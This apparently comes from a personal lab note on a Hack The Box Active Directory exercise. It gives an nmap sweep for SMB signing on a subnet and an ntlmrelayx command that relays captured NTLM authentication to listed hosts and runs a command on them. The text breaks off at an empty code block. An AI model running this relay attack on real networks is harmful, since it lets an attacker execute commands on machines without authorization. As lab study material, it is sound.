Always try to -Pn in the end cuz something it will not show the host even there are the host or something the ping might be blocked.

We can also swipe the whole network
```
nmap --script=smb2-security-mode.nse -p445 192.168.17.0/24 -Pn
```

Now we have to setup the NTLM relay

```
ntlmrelayx.py -tf ~root/HackTheBox/Active_Directory/target.txt -smb2support -c "whoami"
```


Will trigger the event
```
